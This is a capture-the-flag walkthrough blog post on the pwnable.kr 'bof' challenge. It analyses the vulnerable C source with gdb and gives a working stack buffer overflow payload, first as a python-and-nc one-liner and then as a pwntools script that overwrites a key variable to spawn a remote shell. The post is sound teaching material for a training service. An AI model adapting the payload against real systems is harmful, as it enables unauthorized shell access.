---
layout: post
title: "Pwnable.kr BOF Walkthrough"
date: 2022-02-01 18:32:20 +0300
description: You’ll find this post in your `_posts` directory. Go ahead and edit it and re-build the site to see your changes. # Add post description (optional)
img: bof.png # Add image post (optional)
tags: [BOF, PWN, binaryExploit, pwnable.kr] # add tag
---
##    Introduction

Hi there, here is my first article on binary exploitation. We had a responsibility as [cyb0ts](https://twitter.com/cyb0ts) to reasearch and write an article. 
This challenge, as its name bof, focuses on exploiting buffer overflow by overwriting a variable then gain a shell.
Ill look at the various ways, the manual way to exploit it and also using an automated script using [pwntools](https://docs.pwntools.com/en/stable/).

##    Challenge Description
![description](https://i.imgur.com/ZUYz0f8.png)

As we can see, we are provide with the source code, the binary and the port its running on

```bash
┌─[r00t@parrot]─[~/Desktop/pwnable/bof]
└──╼ $ls -la
total 16
drwxr-xr-x 1 r00t r00t   28 Dec 14 15:20 .
drwxr-xr-x 1 r00t r00t    6 Dec 14 14:03 ..
-rw-r--r-- 1 r00t r00t 7348 May 16  2019 bof
-rw-r--r-- 1 r00t r00t  308 May 16  2019 bof.c

```
we can take a look at the code in bof.c
```c=
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}

```

####    Code analysis

We can see, we have two functions ```main() ```  and ```func()```.

Lets start analysing the first function in our code, which is ```func()``` 
```c=
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
```
We see that the function, takes a variable called key. Then it starts by creating a variable ```overflowme``` which is set a buffer of 32 chars. ``` char overflowme[32]``` 
The fuction the prints ```overflow me :``` at line 3 ```printf("overflow me : ")```. It then takes our input and saves it in the variable
we also have an if statement. it checks the ```key``` variable and checks if it is equal to ```0xcafebabe```. If they are equal, it will spawn a shell ```system("/bin/sh");``` else if they are not eqaul it prints ```Nah..``` ```printf("Nah..\n");```

Lets now look at the ```main()``` function
```c=
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```
As we can see, its not a long one. So what is basically does, is calling calling the fuction ```func``` and giving it the value of ```0xdeadbeef```.

So what we have to do, is make the value of the key, equal to ```0xcafebabe``` and not ```0xdeadbeef``` so as to spawn the shell. Since we can control key, we will have to try and controll ```overflowme``` and cause an overflow that will also overwrite ```key.```
```overflowme``` is vulnerable to buffer overflow, since it uses ```gets()``` which is [vulnerable](https://stackoverflow.com/questions/1694036/why-is-the-gets-function-so-dangerous-that-it-should-not-be-used). It is also shown in the man page, that is should not be used. 
> (below highlight in green)

![gets vulnerable](https://i.imgur.com/WeWH0YD.png)


##    Examing the binary
We can start by inputing a short in the binary
![no bof](https://i.imgur.com/qfasj95.png)
We can see the if statement is executed and we are prompted with a Nah..

Now i can try with a long input and see the results, if it will be overflowed or not.
![bof](https://i.imgur.com/kogT7nw.png)
we can see it crashed

So the next move is to know where ```0xdeadbeef``` is located in the stack. Then take a breakpoint before the main() function. We will use gdb here.

![](https://i.imgur.com/wAoXMVD.png)

so I added a breakpoint at main ```break main``` so as it can stop before entering the main function. Then now run the binary ```r```.

So we can now disassemble ```func()``` to get the address of the compare function that compares ```key``` and ``` 0xcafebabe ``` add another breakpoint to so we can study the stack.
```disas func```
![](https://i.imgur.com/ucRdSMv.png)

We can see the ```cmpl``` instruction at  ```0x56555654``` so we can set a breakpoint right before it.```break *0x56555654```. Then continue and wait for the breakpoint.
![](https://i.imgur.com/08K3Xlf.png)
after it reached the breakpoint, I gave it a short input since we dont need it to crash. We need to over look the stack during a normal execution.```x/50wx $esp```
![](https://i.imgur.com/uldG0Oy.png)

We can see ```0xdeadbeef``` appears in the first column after the address ```0xffffcfc0```. Our inputs is represented by the hex values ```0x41414141``` we see. Since ```0x41414141==AAAA``` each hex, represt 4 char. We have 13 of them before reaching ```0xdeadbeef```.

With this in mind, we can now perfectly overwrite ```0xdeadbeef```. Since 1 hex represents 4 chars and they are 13 of them before reaching ```0xdeadbeef```, we can find the number of chars we need to reach it and overwrite it with ```0xcafebabe```
![](https://i.imgur.com/hihgPjs.png)

We can see that we need 52 chars followed by ```0xcafebabe``` to overwrite ```0xdeadbeef```

we can do this using python script that will write the output in a file which we will then run it piped to the ```nc``` port ```python -c "print 'A' * 52 + '\xbe\xba\xfe\xca'" > ./ape ```
Then ```cat ape && cat) | nc pwnable.kr 9000```
![](https://i.imgur.com/zReWcIf.png)

yaay!! we PWNED :-)


---

## Writing a pwntools exploit
We will write our exploit step by step. first, we start by importing pwntools```from pwn import *```
we can now add a variable that holds our payload
```payload= 'A' * 52 + '\xbe\xba\xfe\xca' ```
we can also have another variable for our connection
```shell = remote('pwnable.kr' ,9000)```
Now we can send our payload
```shell.send(payload)```
lastly, is to interact with the shell
```shell.interactive()```

The final exploit will look like:

```python
#!/usr/bin/python
from pwn import *

payload = 'A' * 52 + '\xbe\xba\xfe\xca'
shell = remote('pwnable.kr',9000)
shell.send(payload)
shell.interactive()
```

![](https://i.imgur.com/S3v3Tmj.png)
 we PWNED it once more.
 

---

